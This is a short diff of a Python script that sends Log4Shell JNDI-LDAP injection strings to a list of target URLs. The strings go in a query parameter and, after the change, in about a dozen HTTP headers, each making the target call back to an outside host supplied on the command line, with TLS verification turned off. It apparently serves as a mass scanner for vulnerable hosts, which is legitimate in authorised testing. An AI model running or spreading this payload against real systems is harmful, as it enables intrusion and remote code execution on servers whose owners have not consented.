@@ -13,8 +13,8 @@ if len(argv) > 1:
         try:
             count += 1
             payload = '${jndi:ldap://' + str(count) + '.' + argv[2] + '/a}'
-            params = {'test': payload}
-            headers = {'User-Agent': payload, 'Referer': payload}
+            params = {'id':payload}
+            headers = {'User-Agent':payload, 'Referer':payload, 'CF-Connecting_IP':payload, 'True-Client-IP':payload, 'X-Forwarded-For':payload, 'Originating-IP':payload, 'X-Real-IP':payload, 'X-Client-IP':payload, 'Forwarded':payload, 'Client-IP':payload, 'Contact':payload, 'X-Wap-Profile':payload, 'From':payload}
             url = url.strip()
             print('[{}] Testing {}'.format(count, url))
             requests.get(url, headers=headers, params=params, verify=False, timeout=10)
